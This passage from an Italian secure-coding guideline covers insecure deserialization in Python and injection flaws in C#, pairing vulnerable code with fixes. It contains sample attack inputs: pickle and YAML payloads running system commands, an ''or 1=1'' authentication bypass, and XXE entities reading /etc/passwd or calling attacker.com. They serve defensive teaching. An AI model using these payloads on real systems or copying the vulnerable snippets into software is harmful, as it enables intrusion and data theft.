La “unsecure deserialization” è una vulnerabilità c he si verifica quando un’applicazione utilizza il p rocesso 
di deserializzazione di dati serializzati non atten dibili. Tra la serializzazione da parte del process o originario 
e la deserializzazione da parte del processo di des tinazione, i dati serializzati possono aver subito 
inserimenti di codice dannoso. 
In seguito a deserializzazione di dati inquinati co n porzioni di codice malevolo, l’attaccante può inf liggere un 
attacco di denial of service (DoS) o eseguire codic e arbitrario.  
Come difendersi 
• Evitare di utilizzare le tecniche di serializzazion e/deserializzazione. Se è strettamente necessario 
utilizzarle, verificare che il dato serializzato no n possa essere inquinato e manomesso durante il suo  
percorso. Ad esempio, garantire la trasmissione att raverso una connessione sicura e criptata. 
• Eliminare, se possibile, dal codice sorgente le seg uenti API vulnerabili: 
o Pickle 
  Esempio: 
  import pickle 
  data = """ cos.system(S'dir')tR. """ 
  pickle.loads(data) 
o PyYAML 
  Esempio: 
import yaml 
document = "!!python/object/apply:os.system ['ipcon fig']" 
print(yaml.load(document)) 
o Jsonpickle  
o Metodi encode e store 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 96  a 156  
 
7.6  C# 
C# è un linguaggio di programmazione orientato agli  oggetti sviluppato da Microsoft all’interno 
dell’iniziativa .NET, e successivamente approvato c ome standard della Ecma (ECMA-334) e ISO (norma 
ISO/IEC 23270). La sintassi e la struttura del C# p rendono spunto da vari linguaggi nati precedentemen te, in 
particolare Delphi, C++ e Java. Il risultato è un l inguaggio con meno simbolismo rispetto a C++, meno 
elelementi decorativi rispetto a Java, ma comunque orientato agli oggetti in modo nativo e adatto allo  
sviluppo di una vasta gamma di soluzioni software.  
Vengono di seguito analizzate le principali vulnera bilità e relative contromisure da adottare. 
7.6.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano. Occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli. La codifica dovrebbe essere 
sensibile al contesto, in base al tipo di dato che si vuole neutralizzare: se ci si aspetta che possa 
esserci codice HTML abusivo, occorre codificare gli  eventuali tag HTML, se ci si potrebbe trovare di 
fronte a uno script, allora bisogna codificare gli elementi sintattici di Javascript, ecc. 
• Si consiglia, a tal proposito, di utilizzare la lib reria di codifica ESAPI. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Esempi: 
 
 
Linee guida per lo sviluppo sicuro Pag. 97  a 156  
 
La libreria HtmlSanitizer permette di depurare una stringa in input da costrutti sintattici alla base di un 
attacco XSS. Di seguito una funzione che utilizza t ale libreria: 
 
  public static string SanitizeHtml(string html, pa rams string[] blackList) 
  { 
     var sanitizer = new HtmlSanitizer(); 
     if (blackList != null && blackList.Length > 0)  
     { 
       sanitizer.BlackList.Clear(); 
       foreach (string item in blackList) 
        sanitizer.BlackList.Add(item); 
     } 
     return sanitizer.Sanitize(html); 
  } 
Qui viene mostrato del codice C# vulnerabile alla X SS reflected: 
string nome = Request.QueryString["nome"]; 
Response.Write("Ciao " + nome); // non sicuro 
Di seguito lo stesso codice, messo in sicurezza: 
string nome = Request.QueryString["nome"]; 
nome = System.Web.Security.AntiXss.AntiXssEncoder.H tmlEncode(nome, true); 
Response.Write("Ciao " + nome); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html , 
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
 
7.6.2  Code Injection 
Come riconoscerla 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
Esempio: 
Il codice seguente mostra come del codice C# può es sere passibile di code injection: 
String codiceUtente = request.Form["Codice"]; 
  
CSharpCodeProvider compiler = new CSharpCodeProvide r(); 
CompilerParameters parametri = new CompilerParamete rs();  
parametri.GenerateInMemory = true; 
parametri.GenerateExecutable = true; 
 
try  
{ 
 CompilerResults risultati  = compiler.CompileAssemblyFromSource(parametri, co diceUtente); 
   
 Assembly compilato = risultati .CompiledAssembly;  
 exitCode = ( int )compilato.EntryPoint.Invoke( null , new  object [0]); 
 […] 
Come difendersi. 
• È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è prorpio 
necessario compilare ed eseguire dinamicamente del codice dinamico, occorre allore predisporre 
una sandbox isolata, ad esempio AppDomain di .NET o  un thread isolato.  
• Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato 
e dedicato che abbia privilegi solo per le operazio ni e i file specifici utilizzati dal codice da eseg uire, 
in base al principio denominato "Principle of Least  Privilege". Il principio stabilisce che agli utent i 
 
 
Linee guida per lo sviluppo sicuro Pag. 98  a 156  
 
venga attribuito il più basso livello di “diritti” che possano, detenere rimanendo comunque in grado 
di compiere il proprio lavoro. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html  Improper Control of 
Generation of Code ('Code Injection') CWE-94 
7.6.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
 
Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i non 
viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Esempio: 
Il seguente codice è vulnerabile, poiché se al para metro “comando” viene passato il valore "/ sbin / 
shutdown" e il server Web è in esecuzione come root , la macchina che esegue il server Web verrà arrest ata 
e non sarà disponibile per richieste future: 
public IActionResult Run(string nomeFile) 
{ 
  Process p = new Process(); 
  p.StartInfo.FileName = nomeFile; // Non sicuro 
  p.StartInfo.RedirectStandardOutput = true; 
  p.Start(); 
  string output = p.StandardOutput.ReadToEnd(); 
 
 
Linee guida per lo sviluppo sicuro Pag. 99  a 156  
 
  return Content(output); 
} 
La versione sicura del codice prevede un controllo che filtri le richieste: 
 public IActionResult Run(string nomeFile) 
 { 
  // Se il valore passato è nullo o contiene caratt eri  
  // diversi dalle lettere minuscole o maiuscole 
  // respinge la richiesta 
  if (nomeFile == null || !Regex.IsMatch(nomeFile, "^[a-zA-Z]+$")) 
  { 
   return BadRequest(); 
  } 
 
  Process p = new Process(); 
  p.StartInfo.FileName = nomeFile; // adesso è sicu ro 
  p.StartInfo.RedirectStandardOutput = true; 
  p.Start(); 
  string output = p.StandardOutput.ReadToEnd(); 
  return Content(output); 
 } 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html  CWE-77: Improper 
Neutralization of Special Elements used in a Comman d ('Command Injection') 
7.6.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database o ppure al server. 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata. 
• Le stringhe di connessione possono essere custodite  nel file web.config. Si tratta di una scelta 
migliore rispetto a comporle a runtime con l’input dell’utente. Si separa così l’applicazione dai 
metadati. Il file di configurazione in questione de ve essere messo in sicurezza attivano la modalità 
 
 
Linee guida per lo sviluppo sicuro Pag. 100  a 156  
 
“protected configuration”, che permette di memorizz are le stringhe di connessione in forma 
crittografata (encrypted). 
 
Esempi: 
Metodo dove sono presentati l’approccio vulnerabile  e quello sicuro: 
 
  public void ProcessRequest(HttpContext contesto) 
  { 
    string nomeUtente = contesto.Request.QueryStrin g["nomeUtente"]; 
 
    // Vulnerabile: Uso diretto dell'input dell'ute nte in una stringa di  
    // connessione passata a SqlConnection 
    string connectionString = "server=(local);user id=" + nomeUtente +    
    ";password= pass;"; 
    SqlConnection sqlConnectionBad = new SqlConnect ion(connectionString); 
 
    // Sicuro: Uso di SqlConnectionStringBuilder pe r includere in modo sicuro  
    // l'input dell'utente in una stringa di connes sione 
    SqlConnectionStringBuilder builder = new SqlCon nectionStringBuilder(); 
    builder["Data Source"] = "(local)"; 
    builder["integrated Security"] = true; 
    builder["user id"] = nomeUtente; 
    SqlConnection sqlConnectionGood = new  
     SqlConnection(builder.ConnectionString); 
  } 
 
Nell’esempio che segue viene evidenziata la sezione  che custodisce la stringa di connessione in modali tà 
encrypt nel file di configurazione web.config: 
 
  <connectionStrings configProtectionProvider="RsaP rotectedConfigurationProvider"> 
  <EncryptedData Type="http://www.w3.org/2001/04/xm lenc#Element" 
   xmlns="http://www.w3.org/2001/04/xmlenc#"> 
   <EncryptionMethod Algorithm="http://www.w3.org/2 001/04/xmlenc#tripledes-cbc" /> 
   <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsi g#"> 
    <EncryptedKey xmlns="http://www.w3.org/2001/04/ xmlenc#"> 
     <EncryptionMethod Algorithm="http://www.w3.org /2001/04/xmlenc#rsa-1_5" /> 
     <KeyInfo xmlns="http://www.w3.org/2000/09/xmld sig#"> 
      <KeyName>RSA Key</KeyName> 
     </KeyInfo> 
     <CipherData> 
      
<CipherValue>RXO/zmmy3sR0iOJoF4ooxkFxwelVYpT0riwP2m YpR3FU+r6BPfvsqb384pohivkyNY7Dm 
4lPgR2bE9F7k6TblLVJFvnQu7p7d/yjnhzgHwWKMqb0M0t0Y8DO wogkDDXFxs1UxIhtknc+2a7UGtGh6Di 
3N572qxdfmGfQc7ZbwNE= 
      </CipherValue> 
     </CipherData> 
    </EncryptedKey> 
   </KeyInfo> 
   <CipherData> 
    
<CipherValue>KMNKBuV9nOid8pUvdNLY5I8R7BaEGncjkwYgsh W8ClKjrXSM7zeIRmAy/cTaniu8Rfk92 
KVkEK83+UlQd+GQ6pycO3eM8DTM5kCyLcEiJa5XUAQv4KITBNBN 6fBXsWrGuEyUDWZYm6Eijl8DqRDb11i 
+StkBLlHPyyhbnCAsXdz5CaqVuG0obEy2xmnGQ6G3Mzr74j4ifx nyvRq7levA2sBR4lhE5M80Cd5yKEJkt 
cPWZYM99TmyO3KYjtmRW/Ws/XO3z9z1b1KohE5Ok/YX1YV0+Uk4 /yuZo0Bjk+rErG505YMfRVtxSJ4ee41 
8ZMfp4vOaqzKrSkHPie3zIR7SuVUeYPFZbcV65BKCUlT4EtPLgi 8CHu8bMBQkdWxOnQEIBeY+TerAee/Si 
BCrA8M/n9bpLlRJkUb+URiGLoaj+XHym//fmCclAcveKlba6vKr cbqhEjsnY2F522yaTHcc1+wXUWqif7r 
SIPhc0+MT1hB1SZjd8dmPgtZUyzcL51DoChy+hZ4vLzE= 
    </CipherValue> 
   </CipherData> 
  </EncryptedData> 
 </connectionStrings> 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 101  a 156  
 
7.6.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consisglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white list, 
scartando quelli che non la rispettano). Occorre co ntrollare il tipo del dato, la sua dimensione, l'in tervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
 
Esempio: 
Il seguente codice, avvalendosi di una variabile (n omeutente) pervenuta attraverso l’input, è passbile  di 
LDAP injection, a meno che la stringa non sia sotto posta a codifica (encoding) e validazione. 
 
DirectorySearcher search = new DirectorySearcher(de ); 
search.Filter = "(ACName=" + nomeutente + ")"; 
search.SearchScope = SearchScope.Subtree; 
search.CacheResults = false; 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection') 
7.6.6  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non  dovrebbero utilizzare l’input dell’utente per accedere a risorse del sistema. Nel  
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Esempio: 
Creazione di un socket passibile di resource inject ion, qualora i parametri fossero controllati dall’u tente: 
  public static void Run() 
  { 
    Socket socket = new Socket(AddressFamily.InterN etwork, SocketType.Stream,  
 
 
Linee guida per lo sviluppo sicuro Pag. 102  a 156  
 
    ProtocolType.Tcp); 
 
    TcpClient client = new TcpClient("example.com",  80);  
    UdpClient listener = new UdpClient(80);  
  } 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html, 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.6.7   SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list. Occorre controllare il tipo del dato, la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
 
Esempio: 
Codice vulnerabile:  
 public IActionResult Autenticazione(string nomeUte nte) 
 { 
   // Non sicuro. Un utente malintenzionato può agg irare l'autenticazione passando  
   // nomeUtente con il valore "' or 1=1 or ''='"; 
var query = "SELECT * FROM Utenti WHERE Nome = '" +  nomeUtente + "'";    
var nomeUtenteExists = _context.nomeUtentes.FromSql (query).Any(); 
 
    return Content(nomeUtenteExists ? "success" : " fail"); 
 } 
Codice sicuro: 
 public IActionResult Autenticazione(string nomeUte nte) 
 { 
var query = "SELECT * FROM Utenti WHERE Username = {0}"; // Safe 
var userExists = _context.Users.FromSql(query, nome Utente).Any(); 
return Content(userExists ? "success" : "fail"); 
 } 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html , 
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.6.8  XPath Injection 
Come riconoscerla  
 
 
Linee guida per lo sviluppo sicuro Pag. 103  a 156  
 
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
 
Esempio: 
Codice vulnerabile  
public IActionResult Autenticazione(string nomeuten te, string password) 
{ 
    // Non sicuro. Un attaccante può aggirare  
   // l'autenticazione modificando il valore di nom eutente con "' or 1=1 or ''='" 
    String espressione = "/utenti/nomeutente[@nome= '" + nomeutente +  
     "' and @password='" + password + "']";  
  
    return Content(doc.SelectSingleNode(espressione ) !=  
            null ? "success" : "fail"); 
 } 
 
 Codice sicuro 
 public IActionResult Autenticazione(string nomeute nte, string password) 
 { 
  // Limita nome utente e passwordword alle sole le ttere alfabetiche 
  if (!Regex.IsMatch(nomeutente, "^[a-zA-Z]+$") ||  
    !Regex.IsMatch(password, "^[a-zA-Z]+$")) 
  { 
    return BadRequest(); 
  } 
 
  String espressione = "/utenti/nomeutente[@nome='"  + nomeutente +  
             "' and @password='" + password + "']";   
  return Content(doc.SelectSingleNode(espressione) != null ? "success" : "fail"); 
 } 
 
Per ulteriori informazioni si veda: http://cwe.mitr e.org/data/definitions/643.html, 
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
7.6.9  XML External Entity (XXE) injection 
Come riconoscerla  
Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
le password di sistema oppure eseguito del codice m alevolo. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
 
 
Linee guida per lo sviluppo sicuro Pag. 104  a 156  
 
Come difendersi 
• Bisogna evitare di incorporare entità esterne. 
• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
sensibili. 
• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
dell'applicazione o sul sistema operativo sottostan te.  
• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
• Implementare la convalida dell’input come evidenzia to in altri punti. 
• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
uno schema XSD. 
Esempio : 
Formato non corretto - Il parsing del documento XML , qui racchiuso nella stringa OurOutputXMLString, 
carica qualunque entità esterna, se non validata. 
XmlDocument xmlDoc = new XmlDocument(); 
xmlDoc.LoadXml(OurOutputXMLString); 
Formato corretto - La riga evidenziata imposta a nu ll il valore del resolver. In questo modo s’impedir à al 
parser di prendere in considerazione le entità este rne. 
XmlDocument xmlDoc = new XmlDocument(); 
xmlDoc.XmlResolver = null; 
xmlDoc.LoadXml(OurOutputXMLString); 
Per una regolazione più sottile, basterà utilizzare  una classe derivata da XmlUrlResolver. Si potrà de cidere 
quali domini potranno essere accettati dfile XML.  
7.6.10  Ulteriori indicazioni per lo sviluppo sicuro 
Di seguito ulteriori suggerimenti per lo sviluppo s icuro in C#. 
7.6.10.1  Managed Wrapper per l'implementazione del codice na tivo 
Spesso sorge la necessità di rendere disponibile un a funzionalità utile in codice nativo per il codice  gestito. 
La realizzazione dei managed wrapper può essere sem plificata usando platform invoke o COM interop. Per  
la riuscita di quest’operazione è tuttavia necessar io che i chiamanti dei wrapper dispongano di diritt i per il 
codice non gestito (unmanaged code).  
Invece di concedere diritti per il codice non gesti to a tutte le applicazioni che usano il wrapper, è preferibile 
fornire questi diritti solo al codice wrapper. Se l a funzionalità sottostante non espone alcuna risors a e 
l'implementazione è verosimilmente sicura, chiunque  potrà chiamare il wrapper con i regolari diritti 
sull’unmanaged code. Quando invece, la funzionalità  nativa espone delle risorse, il wrapper può metter e i 
suoi chiamanti in pericolo, per cui è necessaria, d a parte sua, un’attenta verifica della sicurezza de l codice 
nativo. 
7.6.10.2   Library Code che espone risorse protette 
La libreria funge da interfaccia per l’accesso a de terminate risorse che non sono altrimenti disponibi li; deve 
quindi richiedere autorizzazioni per l’accesso alle  risorse che utilizzano. In generale, laddove si es pone una 
risorsa (qualunque essa sia), il codice deve implem entare una richiesta di autorizzazione appropriata alla 
risorsa (cioè deve eseguire un controllo di protezi one).  
7.6.10.3  Richieste di autorizzazione 
La richiesta di autorizzazioni è il modo in cui si consente al Common Runtime Language (CLR) di .NET d i 
sapere cosa deve fare il codice per eseguire il pro prio lavoro. Sebbene la richiesta di autorizzazioni  sia 
facoltativa e non sia necessaria per la compilazion e del codice, ci sono importanti motivi per richied ere le 
 
 
Linee guida per lo sviluppo sicuro Pag. 105  a 156  
 
appropriate autorizzazioni all'interno del codice. Quando il codice richiede autorizzazioni utilizzand o il 
metodo Demand, CLR verifica che tutti i moduli che chiamano il codice in questione dispongano delle 
autorizzazioni appropriate. Senza queste autorizzaz ioni, la richiesta non riesce. La verifica delle 
autorizzazioni viene determinata eseguendo uno stac k-walk. È importante dal punto di vista dell'usabil ità e 
della sicurezza che il codice riceva le autorizzazi oni minime necessarie per l'esecuzione. 
Nell'esempio di codice riportato di seguito viene i llustrata una richiesta di autorizzazione di base: 
 
[assembly :FileIOPermissionAttribute(SecurityAction.RequestMi nimum,Write= "C:\\test.tmp" )] 
[assembly :PermissionSet(SecurityAction.RequestOptional,Unres tricted=false)] 
 
Questo esempio indica al sistema di protezione del Framework .NET che il codice non dovrebbe essere 
eseguito a meno che, non riceva l'autorizzazione a scrivere a C: \ test.tmp. Se il codice incontra sem pre 
criteri di protezione che non concedono quest’autor izzazione, viene generata una PolicyException e il 
codice non viene eseguito. Utilizzando questa richi esta, si può essere certi che il codice verrà esegu ito solo 
se verrà concessa tale autorizzazione. 
Questo esempio indica anche al sistema che non è ri chiesta alcuna autorizzazione aggiuntiva. Le 
autorizzazioni di esecuzione non necessarie al codi ce possono portare a problemi di sicurezza. 
Un altro modo per limitare le autorizzazioni che il  codice riceve, in base al criterio dei minimi priv ilegi, è 
quello di elencare le autorizzazioni specifiche che  si desidera rifiutare.  
7.6.10.4  Protezione dell'accesso ai metodi 
.NET Framework fornisce un meccanismo denominato Co de Access Security (CAS), che consente di 
applicare vari livelli di attendibilità a codice di verso in esecuzione nella stessa applicazione. 
Alcuni metodi potrebbero non essere adatti per cons entire le chiamate da parte di codice arbitrario no n 
attendibile. Potrebbero, infatti, fornire informazi oni limitate; potrebbero non eseguire il controllo degli 
errori sui parametri; non verificare la correttezza  dei parametri; potrebbero funzionare in modo non 
corretto o causare qualche problema. L'utente dovre bbe essere informato di questi casi e adottare le 
misure appropriate per proteggerli. 
In alcuni casi, potrebbe essere necessario limitare  i metodi che non sono destinati all'uso generalizz ato da 
parte del pubblico, ma che devono comunque essere e sposti pubblicamente. Ad esempio, nel caso di 
un'interfaccia che deve essere chiamata attraverso le proprie DLL e pertanto deve essere pubblica, ma che 
non si vuole esporre pubblicamente, per evitare che  il suo punto d’ingresso possa essere sfruttato da 
codice dannoso. Un altro motivo comune per limitare  un metodo non destinato all'uso pubblico (ma che 
deve essere pubblico) consiste nell'evitare di dove r documentare e supportare quella che potrebbe esse re 
un'interfaccia molto interna. 
Il codice gestito (managed code) offre diverse poss ibilità per essere adeguatamente protetto: 
Limitare l'ambito di accessibilità alla classe, all 'assembly o alle classi derivate, se queste sono af fidabili. 
Questo è il modo più semplice per limitare l'access o al metodo. Si noti che, in generale, le classi de rivate 
possono essere meno affidabili della classe da cui derivano, sebbene in alcuni casi condividano l'iden tità 
della classe genitore. In particolare, non dedurre il grado di sicuerzza dalla parola chiave protected , che 
viene utilizzata in un contesto non necessariamente  relativo alla sicurezza. 
Limitare l'accesso del metodo a determinati chiaman ti. Il criterio di selezione può essere il nome sic uro 
(strong name), l’identità di chi lo pubblica, la zo na, ecc. 
Limitare l'accesso del metodo ai chiamanti che disp ongono di specifiche autorizzazioni. 
